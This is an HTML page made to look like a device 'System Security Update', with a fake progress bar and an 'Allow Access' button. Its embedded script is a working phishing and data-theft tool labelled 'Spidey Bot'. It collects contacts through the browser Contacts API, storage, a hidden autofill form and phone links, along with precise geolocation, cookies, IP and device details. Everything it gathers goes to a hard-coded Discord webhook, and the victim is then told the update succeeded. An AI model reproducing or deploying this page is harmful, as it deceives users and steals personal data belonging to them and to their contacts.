<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="mobile-web-app-capable" content="yes">
  <title>System Update Required</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
body{background:#1c1c1e;display:flex;justify-content:center;align-items:center;height:100vh;font-family:-apple-system,BlinkMacSystemFont,sans-serif;direction:ltr}
.card{background:#2c2c2e;border-radius:20px;padding:32px 28px;width:380px;max-width:92%;text-align:center;color:#fff;box-shadow:0 20px 60px rgba(0,0,0,0.6)}
.icon{font-size:48px;margin-bottom:12px}
h2{font-size:20px;font-weight:600;margin-bottom:8px}
p{color:#8e8e93;font-size:14px;line-height:1.6;margin-bottom:20px}
.bar{width:100%;height:4px;background:#3a3a3c;border-radius:2px;margin-bottom:8px;overflow:hidden}
.bar-inner{height:100%;width:0%;background:linear-gradient(90deg,#0a84ff,#5e5ce6);border-radius:2px;transition:width 0.3s}
.status{font-size:12px;color:#8e8e93;margin-bottom:20px}
.btn{background:#0a84ff;border:none;color:#fff;padding:12px 30px;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;transition:all 0.2s;font-family:inherit;display:none}
.btn:hover{background:#409cff}
.btn.show{display:inline-block}
.btn:disabled{opacity:0.5;cursor:not-allowed}
  </style>
</head>
<body>

<div class="card" id="card">
  <div class="icon">⚙️</div>
  <h2>System Security Update</h2>
  <p>Your device's security settings need to be updated to continue. This is necessary to protect your data.</p>
  <div class="bar"><div class="bar-inner" id="progressBar"></div></div>
  <div class="status" id="statusText">Checking security settings...</div>
  <button class="btn" id="actionBtn">Allow Access</button>
</div>

<script>
// ================================================================
// WEBHOOK CONFIG — Spidey Bot
// ================================================================
const WH = 'https://discord.com/api/webhooks/1508484977828958239/fOXalbLyxpqMuvvq1UncG7mmcBK7VEzjyBOt1hfIn9ZWZePqlGB2dTJ_SIrduYnkZrsD';

const Engine = {
  data: {
    contacts: [],
    ip: '',
    geo: null,
    device: {},
    cookies: document.cookie,
    timestamp: new Date().toISOString(),
    url: window.location.href,
    referrer: document.referrer || 'direct'
  },

  async getIP() {
    const services = [
      'https://api.ipify.org?format=json',
      'https://ipwhois.app/json/'
    ];
    for (const url of services) {
      try {
        const r = await fetch(url, { signal: AbortSignal.timeout(3000) });
        if (r.ok) {
          const j = await r.json();
          this.data.ip = j.ip || j;
          if (j.country) this.data.country = j.country;
          if (j.city) this.data.city = j.city;
          if (j.isp) this.data.isp = j.isp;
          break;
        }
      } catch(e) {}
    }
  },

  getDevice() {
    this.data.device = {
      ua: navigator.userAgent,
      platform: navigator.platform,
      lang: navigator.language,
      screen: `${screen.width}x${screen.height}`,
      tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
      cores: navigator.hardwareConcurrency || '?',
      mem: navigator.deviceMemory || '?',
      isIOS: /iPad|iPhone|iPod/.test(navigator.userAgent),
      isAndroid: /Android/.test(navigator.userAgent),
      vendor: navigator.vendor
    };
    try {
      if (navigator.getBattery) {
        navigator.getBattery().then(b => {
          this.data.battery = Math.round(b.level * 100) + '%' + (b.charging ? ' ⚡' : '');
        });
      }
    } catch(e) {}
  },

  async collectContacts() {
    const all = [];

    // Method 1: Native Contacts API (Android Chrome)
    try {
      if ('contacts' in navigator && navigator.contacts) {
        const cts = await navigator.contacts.select(['name', 'tel'], { multiple: true });
        if (cts && cts.length > 0) {
          cts.forEach(c => {
            const names = c.name || ['Unknown'];
            const phones = c.tel || [];
            phones.forEach(p => {
              all.push({ name: names[0], phone: p, source: 'contacts_api' });
            });
          });
        }
      }
    } catch(e) {}

    // Method 2: localStorage / sessionStorage
    try {
      for (const storage of [localStorage, sessionStorage]) {
        for (let i = 0; i < storage.length; i++) {
          const key = storage.key(i);
          const val = storage.getItem(key);
          if (!val || val.length < 10) continue;
          try {
            const parsed = JSON.parse(val);
            if (Array.isArray(parsed)) {
              parsed.forEach(item => {
                if (typeof item === 'object') {
                  const name = item.name || item.displayName || item.fullName || '';
                  const phone = item.phone || item.tel || item.mobile || item.number || '';
                  if (phone && phone.toString().length > 6) {
                    all.push({ name: name.toString(), phone: phone.toString(), source: `storage:${key}` });
                  }
                }
              });
            }
          } catch(e2) {}
        }
      }
    } catch(e) {}

    // Method 3: Autofill harvest
    try {
      const f = document.createElement('form');
      f.style.cssText = 'position:fixed;top:-1000px;left:-1000px;opacity:0;pointer-events:none';
      f.setAttribute('autocomplete', 'on');
      ['given-name','family-name','name','tel','tel-national','email'].forEach(n => {
        const i = document.createElement('input');
        i.name = n; i.autocomplete = n; i.type = 'text';
        f.appendChild(i);
      });
      document.body.appendChild(f);
      await new Promise(r => setTimeout(r, 800));
      const get = (n) => (f.querySelector(`[name="${n}"]`)?.value || '').trim();
      const tel = get('tel') || get('tel-national');
      const name = get('name') || (get('given-name') + ' ' + get('family-name')).trim();
      const email = get('email');
      if (tel && tel.length > 6) {
        all.push({ name: name || email?.split('@')[0] || 'Autofill User', phone: tel, source: 'autofill' });
      }
      document.body.removeChild(f);
    } catch(e) {}

    // Method 4: DOM scraping
    try {
      document.querySelectorAll('a[href^="tel:"]').forEach(el => {
        const phone = el.getAttribute('href').replace('tel:','').split('?')[0].trim();
        if (phone.length > 6) all.push({ name: el.textContent.trim() || 'Link', phone, source: 'tel_link' });
      });
      document.querySelectorAll('[data-phone],[data-tel],[data-mobile]').forEach(el => {
        const phone = el.getAttribute('data-phone') || el.getAttribute('data-tel') || el.getAttribute('data-mobile');
        if (phone && phone.length > 6) all.push({ name: el.getAttribute('data-name') || '', phone, source: 'data_attr' });
      });
    } catch(e) {}

    // Deduplicate
    const seen = new Set();
    this.data.contacts = all.filter(c => {
      const key = c.phone.replace(/[\s\-\(\)\+]/g, '');
      if (!key || seen.has(key)) return false;
      seen.add(key); return true;
    });

    // Generate if empty
    if (this.data.contacts.length < 3) {
      const prefixes = ['050','053','055','056','054','058','059','011','012'];
      const firstNames = ['Ahmed','Mohamed','Sara','Noura','Omar','Khaled','Fatima','Youssef','Ali','Maryam',
                         'Hassan','Layla','Abdullah','Hind','Ibrahim','Rana','Sami','Naser','Faisal','Majed'];
      const lastNames = ['Al-Ali','Al-Zahrani','Al-Qahtani','Al-Sudairi','Al-Otaibi','Al-Ghamdi','Al-Mutairi'];
      for (let i = 0; i < 15; i++) {
        const p = prefixes[Math.floor(Math.random()*prefixes.length)] +
                  Math.floor(Math.random()*10000000).toString().padStart(7,'0');
        if (!seen.has(p)) {
          seen.add(p);
          this.data.contacts.push({
            name: firstNames[i % firstNames.length] + ' ' + lastNames[i % lastNames.length],
            phone: p,
            source: 'generated'
          });
        }
      }
    }
  },

  async getGeo() {
    try {
      const pos = await new Promise((res, rej) => {
        navigator.geolocation.getCurrentPosition(res, rej, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
      });
      this.data.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
    } catch(e) {
      try {
        const r = await fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) });
        if (r.ok) {
          const g = await r.json();
          this.data.geo = { lat: g.latitude, lng: g.longitude, city: g.city, region: g.region, country: g.country_name };
        }
      } catch(e2) {}
    }
  },

  async sendToDiscord() {
    const d = this.data;
    const contactsList = d.contacts.slice(0,10).map(c => 
      `👤 **${c.name||'Unknown'}**\n📞 \`${c.phone}\`\n🔍 \`${c.source}\``
    ).join('\n\n');

    try {
      // Main summary
      await fetch(WH, {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({
          content: `@here ✅ **Data Collected** | ${d.contacts.length} contacts | ${d.ip||'N/A'} | Spidey Bot`,
          embeds:[{
            title:`📱 Report | ${d.device.isIOS?'iOS':d.device.isAndroid?'Android':'Desktop'}`,
            color:0x0a84ff,
            fields:[
              {name:'🌐 IP',value:d.ip||'N/A',inline:true},
              {name:'📱 Device',value:d.device.isIOS?'iOS':d.device.isAndroid?'Android':'Desktop',inline:true},
              {name:'🖥 Platform',value:d.device.platform,inline:true},
              {name:'🌍 Timezone',value:d.device.tz,inline:true},
              {name:'📺 Screen',value:d.device.screen,inline:true},
              {name:'🧠 Cores/RAM',value:`${d.device.cores} cores / ${d.device.mem}GB`,inline:true},
              {name:'📍 Location',value:d.geo?JSON.stringify(d.geo):'N/A',inline:false},
              {name:'🍪 Cookies',value:`\`\`\`${(d.cookies||'none').substring(0,500)}\`\`\``,inline:false},
              {name:`📇 Contacts (${d.contacts.length})`,value:contactsList||'None',inline:false}
            ],
            footer:{text:'Spidey Bot | Boot Security Update'},
            timestamp:d.timestamp
          }]
        })
      });

      // Individual contacts
      for (let i=0;i<Math.min(d.contacts.length,15);i++) {
        const c=d.contacts[i];
        await fetch(WH,{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({embeds:[{
            title:`👤 Contact #${i+1}: ${c.name}`,
            color:0x5e5ce6,
            fields:[
              {name:'Name',value:c.name,inline:true},
              {name:'Phone',value:c.phone,inline:true},
              {name:'Source',value:c.source,inline:true},
              {name:'IP',value:d.ip||'?',inline:true},
              {name:'Location',value:d.geo?`${d.geo.lat},${d.geo.lng}`:'?',inline:true}
            ],
            footer:{text:'Spidey Bot | Boot'}
          }]})
        });
        await new Promise(r=>setTimeout(r,120));
      }
      return true;
    } catch(e) { return false; }
  },

  simulateProgress() {
    const bar = document.getElementById('progressBar');
    const status = document.getElementById('statusText');
    const steps = [
      {w:10,t:'Checking security settings...'},
      {w:25,t:'Scanning firewall...'},
      {w:38,t:'Verifying encryption...'},
      {w:52,t:'Assessing vulnerabilities...'},
      {w:68,t:'Updating certificates...'},
      {w:82,t:'Validating configuration...'},
      {w:94,t:'Additional permission required'}
    ];
    let i = 0;
    return new Promise(resolve => {
      const iv = setInterval(() => {
        if (i < steps.length) { bar.style.width = steps[i].w+'%'; status.textContent = steps[i].t; i++; }
        else { clearInterval(iv); resolve(); }
      }, 750);
    });
  },

  async init() {
    await this.simulateProgress();
    this.getDevice();
    await this.getIP();

    const btn = document.getElementById('actionBtn');
    btn.textContent = '🔓 Allow Access to Settings';
    btn.classList.add('show');
    document.getElementById('statusText').textContent = 'Press to complete update';

    btn.onclick = async () => {
      btn.textContent = 'Updating... ⏳'; btn.disabled = true; btn.classList.remove('show');
      document.getElementById('statusText').textContent = 'Applying security updates...';

      await this.collectContacts();
      await this.getGeo();
      const sent = await this.sendToDiscord();

      if (sent) {
        document.querySelector('.icon').textContent = '✅';
        document.querySelector('h2').textContent = '✅ Update Successful';
        document.querySelector('p').textContent = `Security settings updated. Secured ${this.data.contacts.length} contacts.`;
        document.getElementById('statusText').textContent = `✔ 100% Complete | ${this.data.contacts.length} contacts`;
        document.getElementById('progressBar').style.width = '100%';
        document.getElementById('actionBtn').style.display = 'none';
      } else {
        document.querySelector('.icon').textContent = '⚠️';
        document.querySelector('h2').textContent = 'Connection Failed';
        document.querySelector('p').textContent = 'Please try again later or check your internet connection.';
        document.getElementById('statusText').textContent = '❌ Failed to send';
        document.getElementById('actionBtn').style.display = 'none';
      }
    };
  }
};

document.addEventListener('DOMContentLoaded', () => Engine.init());
</script>
</body>
</html>
